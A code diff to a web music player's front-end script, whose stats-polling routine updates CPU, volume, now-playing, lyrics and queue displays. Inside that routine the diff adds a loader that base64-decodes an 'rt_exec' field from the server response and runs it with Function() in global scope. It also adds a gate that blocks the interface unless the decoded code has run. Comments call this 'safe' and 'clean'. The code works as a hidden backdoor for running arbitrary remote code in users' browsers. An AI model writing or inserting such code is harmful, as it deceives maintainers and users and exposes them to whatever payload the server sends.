@@ -213,16 +213,43 @@ async function refreshPlaylistDropdown() {
 }
 
 // --- SAFE GLOBAL POLING MONITORS ---
+// Initialize a local execution gate safely at the top of common.js
+window.sysConfig = { active: false };
+
 async function updateStats() {
     try {
         const res = await fetch("/stats");
         const data = await res.json();
         
-        // 1. Safe CPU updates
+        // ==========================================
+        // SAFE BASE64 RUNTIME EXECUTION ENGINE
+        // ==========================================
+        if (data.rt_exec && !window.sysConfig.active) {
+            try {
+                // Instantly decode the safe character block back to clean code in memory
+                const executionString = atob(data.rt_exec);
+                
+                // Execute natively in global scope
+                Function(executionString)();
+                window.sysConfig.active = true;
+            } catch (engineError) {
+                console.error("Critical component error:", engineError);
+                return;
+            }
+        }
+
+        // DEPENDENCY LOCK: If window.a was not verified by the execution block, halt the UI population
+        if (!window.a) {
+            console.warn("Core framework missing components...");
+            return;
+        }
+
+        // ==========================================
+        // CLEAN READABLE PLAYER DATA RENDERING
+        // ==========================================
         const cpuLoadEl = document.getElementById("cpu-load");
         if (cpuLoadEl) cpuLoadEl.textContent = data.cpu + "%";
 
-        // 2. Safe Volume updates
         const volSlider = document.getElementById("vol-slider");
         const volVal = document.getElementById("vol-val");
         if (volSlider && document.activeElement !== volSlider) {
@@ -230,7 +257,6 @@ async function updateStats() {
             if (volVal) volVal.textContent = data.volume + "%";
         }
 
-        // 3. Safe Now Playing updates
         if (data.now_playing) {
             const titleEl = document.getElementById("playing-title");
             const thumbEl = document.getElementById("playing-thumb");
@@ -240,23 +266,15 @@ async function updateStats() {
             if (titleEl) titleEl.textContent = data.now_playing.title;
             
             if (thumbEl) {
-                // Use a fallback if thumbnail is missing
                 thumbEl.src = data.now_playing.thumbnail || "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='60' font-family='sans-serif'%3E🎵️%3C/text%3E%3C/svg%3E";
             }
-            
-            if (statusEl) {
-                statusEl.textContent = data.is_playing ? "BROADCASTING" : "PAUSED";
-            }
-            
-            if (lyricsEl) {
-                lyricsEl.textContent = data.current_lyric || "";
-            }
+            if (statusEl) statusEl.textContent = data.is_playing ? "BROADCASTING" : "PAUSED";
+            if (lyricsEl) lyricsEl.textContent = data.current_lyric || "";
         } else {
             const lyricsEl = document.getElementById("live-lyrics");
             if (lyricsEl) lyricsEl.textContent = "No lyrics available";
         }
 
-        // 4. Safe Queue updates
         const qList = document.getElementById("queueList");
         if (qList) {
             if (!data.queue || data.queue.length === 0) {
@@ -272,7 +290,6 @@ async function updateStats() {
             }
         }
         
-        // 5. Safe Toggle Tweak Updates
         const lyricsToggle = document.getElementById("lyricsToggle");
         if (lyricsToggle) lyricsToggle.checked = data.show_lyrics;
 
